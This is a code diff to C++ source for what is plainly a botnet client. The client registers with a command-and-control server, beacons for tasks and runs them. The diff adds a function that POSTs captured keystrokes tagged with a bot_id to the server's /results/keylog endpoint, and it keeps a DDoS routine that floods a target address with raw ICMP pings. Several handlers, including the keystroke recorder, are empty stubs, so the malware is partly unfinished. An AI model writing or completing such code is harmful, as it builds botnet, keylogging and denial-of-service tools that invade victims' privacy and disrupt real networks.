@@ -12,10 +12,15 @@
 #include <fstream>
 #include <thread>
 #include <netinet/ip_icmp.h>
+#include <X11/Xlib.h>
+#include <linux/input.h> 
+#include <fcntl.h> 		 
+#include <stdlib.h> 
+#include "helper.h"
 
 using json = nlohmann::json;
 
-Worker registerWorker(const char* serverIP, int serverPort, in_addr ipAddress, std::string cpu, std::string ramInfo) {
+Worker registerWorker(const char* serverIP, int serverPort, in_addr ipAddress, std::string cpu, std::string ramInfo, std::vector<std::string>* logs) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) {
         std::cerr << "Failed to create socket." << std::endl;
@@ -114,7 +119,7 @@ Worker registerWorker(const char* serverIP, int serverPort, in_addr ipAddress, s
     return worker;
 }
 
-in_addr getIpAddress() {
+in_addr getIpAddress(std::vector<std::string>* logs) {
     char hostname[256];
     if (gethostname(hostname, sizeof(hostname)) != 0) {
         std::cerr << "Failed to get hostname." << std::endl;
@@ -134,12 +139,12 @@ in_addr getIpAddress() {
     struct in_addr addr;
     memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
 
-    std::cout << "IP Address: " << inet_ntoa(addr) << std::endl;
+    processLog("IP Address: " + std::string(inet_ntoa(addr)), logs);
 
     return addr;
 }
 
-std::string getCPUModelName() {
+std::string getCPUModelName(std::vector<std::string>* logs) {
     std::ifstream cpuinfo("/proc/cpuinfo");
     std::string line;
     std::string modelName;
@@ -154,7 +159,7 @@ std::string getCPUModelName() {
     return modelName;
 }
 
-std::string getRAMInfo() {
+std::string getRAMInfo(std::vector<std::string>* logs) {
     std::ifstream meminfo("/proc/meminfo");
     std::string line;
     std::string ramInfo;
@@ -178,7 +183,7 @@ std::string getRAMInfo() {
     return ramInfo;
 }
 
-Command beacon(const char* serverIP, int serverPort, Worker worker, Task task) {
+Command beacon(const char* serverIP, int serverPort, Worker worker, Task task, std::vector<std::string>* logs) {
     // Create a socket
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) {
@@ -272,6 +277,9 @@ Command beacon(const char* serverIP, int serverPort, Worker worker, Task task) {
             else if (action == "STOP") {
                 commandObject = Command::STOP;
             }
+            else if (action == "REGISTER") {
+                commandObject = Command::REGISTER;
+            }
             else {
                 std::cerr << "Invalid action name: " << action << std::endl;
             }
@@ -283,7 +291,7 @@ Command beacon(const char* serverIP, int serverPort, Worker worker, Task task) {
     return commandObject;
 }
 
-std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest) {
+std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest, std::vector<std::string>* logs) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) {
         std::cerr << "Failed to create socket." << std::endl;
@@ -339,7 +347,7 @@ std::string extractJSON(std::string json) {
     return extractedJSON;
 }
 
-Task request(const char* serverIP, int serverPort, Worker worker) {
+Task request(const char* serverIP, int serverPort, Worker worker, std::vector<std::string>* logs) {
     int bot_id = worker.id;
 
     // Construct the query string
@@ -352,7 +360,7 @@ Task request(const char* serverIP, int serverPort, Worker worker) {
         "Content-Type: application/json\r\n"
         "\r\n";
 
-    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest);
+    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest, logs);
     if (httpResponse.find("HTTP/1.1 204 No Content") != std::string::npos) {
         std::cerr << "No Tasks available" << std::endl;
         return Task(); // No need for cleanup on Linux
@@ -369,6 +377,8 @@ Task request(const char* serverIP, int serverPort, Worker worker) {
     rapidjson::Document document;
     document.Parse(extractedJSON.c_str());
 
+
+
     if (document.HasParseError()) {
         std::cerr << "Failed to parse JSON." << std::endl;
         return Task(); // No need for cleanup on Linux
@@ -379,32 +389,33 @@ Task request(const char* serverIP, int serverPort, Worker worker) {
     if (document.IsObject()) {
         if (document.HasMember("id") && document["id"].IsInt()) {
             int id = document["id"].GetInt();
-            std::cout << "ID: " << id << std::endl;
+            processLog("ID: " + std::to_string(id), logs);
             taskObject.id = id;
         }
 
         if (document.HasMember("task") && document["task"].IsString()) {
             std::string task = document["task"].GetString();
             taskObject.task = task;
+            processLog("Recieved Task: " + task, logs);
         }
 
         if (document.HasMember("taskParameters") && document["taskParameters"].IsObject()) {
             const rapidjson::Value& taskParams = document["taskParameters"];
             if (taskParams.HasMember("address") && taskParams["address"].IsString()) {
                 std::string address = taskParams["address"].GetString();
-                std::cout << "Address: " << address << std::endl;
+                processLog("Address: " + address, logs);
                 taskObject.taskParams.address = address;
             }
 
             if (taskParams.HasMember("interval") && taskParams["interval"].IsInt()) {
                 int interval = taskParams["interval"].GetInt();
-                std::cout << "Interval: " << interval << std::endl;
+                processLog(std::to_string(interval), logs);                std::cout << "Interval: " << interval << std::endl;
                 taskObject.taskParams.interval = interval;
             }
 
             if (taskParams.HasMember("log") && taskParams["log"].IsBool()) {
                 bool log = taskParams["log"].GetBool();
-                std::cout << "log: " << log << std::endl;
+                processLog("Log: " + log, logs);
                 taskObject.taskParams.log = log;
             }
         }
@@ -413,45 +424,47 @@ Task request(const char* serverIP, int serverPort, Worker worker) {
     return taskObject;
 }
 
-bool doTask(const char* serverIP, int serverPort, Task task) {
+bool doTask(const char* serverIP, int serverPort, const Task& task, std::vector<std::string>* logs, Worker worker) {
     TaskOptions tOption = getTaskOption(task.task);
     bool finishedSuccessfully = false;
+    std::vector<int> keystrokes;
     switch (tOption) {
-    case TaskOptions::DDOS:
-        std::cout << "Processing DDOS task..." << std::endl;
-        // Add DDOS task handling code here
-        finishedSuccessfully = doDDOS(task);;
-        break;
-    case TaskOptions::KEY_LOG:
-        std::cout << "Processing KEY_LOG task..." << std::endl;
-        // Add KEY_LOG task handling code here
-        finishedSuccessfully = true;
-        break;
-    case TaskOptions::PORT_SCAN:
-        std::cout << "Processing PORT_SCAN task..." << std::endl;
-        // Add PORT_SCAN task handling code here
-        finishedSuccessfully = true;
-        break;
-    case TaskOptions::QUACK:
-        std::cout << "Processing QUACK task..." << std::endl;
-        // Add QUACK task handling code here
-        finishedSuccessfully = true;
-        break;
-    case TaskOptions::STORAGE:
-        std::cout << "Processing STORAGE task..." << std::endl;
-        // Add STORAGE task handling code here
-        finishedSuccessfully = true;
-        break;
-    case TaskOptions::UNKNOWN:
-        std::cout << "Unknown task option." << std::endl;
-        // Add code for handling unknown task here
-        finishedSuccessfully = false;
-        break;
+        case TaskOptions::DDOS:
+            processLog("Processing DDOS task...", logs);
+            // Add DDOS task handling code here
+            finishedSuccessfully = doDDOS(task, logs);;
+            break;
+        case TaskOptions::KEY_LOG:
+            processLog("Processing KEY_LOG task...", logs);
+            recordKeystrokes(task.taskParams.interval, logs);
+            //sendKeyLogs(serverIP, serverPort, keystrokes, logs, worker.id);
+            finishedSuccessfully = true;
+            break;
+        case TaskOptions::PORT_SCAN:
+            processLog("Processing PORT_SCAN task...", logs);
+            // Add PORT_SCAN task handling code here
+            finishedSuccessfully = true;
+            break;
+        case TaskOptions::QUACK:
+            processLog("Processing QUACK task...", logs);
+            playSound(logs);
+            finishedSuccessfully = true;
+            break;
+        case TaskOptions::STORAGE:
+            processLog("Processing STORAGE task...", logs);
+            // Add STORAGE task handling code here
+            finishedSuccessfully = true;
+            break;
+        case TaskOptions::UNKNOWN:
+            processLog("Nothing to do.", logs);
+            // Add code for handling unknown task here
+            finishedSuccessfully = false;
+            break;
     }
     return finishedSuccessfully;
 }
 
-void makeHttpDDOSRequest(std::string address, bool log) {
+void makeHttpDDOSRequest(std::string address, bool log, std::vector<std::string>* logs) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) {
         std::cerr << "Failed to create socket." << std::endl;
@@ -490,7 +503,7 @@ void makeHttpDDOSRequest(std::string address, bool log) {
         else if (bytesRead > 0) {
             buffer[bytesRead] = '\0';
             std::string response(buffer);
-            std::cout << "Received response: " << response << std::endl;
+            processLog("Received response: " + response, logs);
         }
         else {
             std::cerr << "No response received." << std::endl;
@@ -501,13 +514,13 @@ void makeHttpDDOSRequest(std::string address, bool log) {
     close(sock);
 }
 
-bool doDDOS(Task task) {
+bool doDDOS(Task task, std::vector<std::string>* logs) {
     std::string address = task.taskParams.address;
     int interval = task.taskParams.interval;
 
 
     for (int i = 0; i < interval; ++i) {
-        sendPing(address.c_str());
+        sendPing(address.c_str(), logs);
     }
 
     return true;
@@ -527,7 +540,7 @@ unsigned short checksum(unsigned short* buf, int len) {
     return (unsigned short)(~sum);
 }
 
-void sendPing(const char *address) {
+void sendPing(const char *address, std::vector<std::string>* logs) {
     int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (sockfd < 0) {
         perror("socket");
@@ -556,6 +569,48 @@ void sendPing(const char *address) {
     }
 
     close(sockfd);
+}
+
+void sendKeyLogs(const char* serverIP, int serverPort, std::vector<int> keyLogs, std::vector<std::string>* logs, int bot_id) {
+    // Convert logs to a JSON array
+    std::string logsJson = "[";
+
+    for (int log : keyLogs) {
+        // Convert int to string and escape special characters
+        std::string logString = std::to_string(log);
+
+        // Escape special characters in each log entry
+        size_t pos = 0;
+        while ((pos = logString.find("\n", pos)) != std::string::npos) {
+            logString.replace(pos, 1, "\\n");
+            pos += 2; // Move past the replaced characters
+        }
+
+        logsJson += "\"" + logString + "\",";
+    }
+
+    if (!keyLogs.empty()) {
+        logsJson.pop_back(); // Remove the trailing comma
+    }
+
+    logsJson += "]";
+
+    // Construct the JSON object with the desired structure
+    std::string jsonBody = "{\"keys\": " + logsJson + "}";;
+
+    // Construct the query string
+    std::string queryParams = "bot_id=" + std::to_string(bot_id);
+
+    // Create the HTTP request POST method
+    std::string httpRequest = "POST /results/keylog?" + queryParams + " HTTP/1.1\r\n"
+        "Host: " + std::string(serverIP) + "\r\n"
+        "Connection: close\r\n"
+        "Content-Type: application/json\r\n"
+        "Content-Length: " + std::to_string(jsonBody.size()) + "\r\n"
+        "\r\n" + jsonBody;
+
+    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest, logs);
+
 }
 
 void sendLogs(const char* serverIP, int serverPort, std::vector<std::string> logs, int bot_id) {
@@ -594,6 +649,22 @@ void sendLogs(const char* serverIP, int serverPort, std::vector<std::string> log
         "Content-Length: " + std::to_string(jsonBody.size()) + "\r\n"
         "\r\n" + jsonBody;
 
-    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest);
-    return;
+    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest, &logs);
+}
+
+void playSound(std::vector<std::string>* logs) {
+    processLog("PLAY SOUND :(", logs);
+}
+
+int recordKeystrokes(int durationSeconds, std::vector<std::string>* logs) {
+
+    processLog("--------------------------", logs);
+    processLog("Begin Recording KeyStrokes", logs);
+
+    
+
+    processLog("Finished Recording KeyStrokes", logs);
+    processLog("--------------------------", logs);
+
+    return 1;
 }
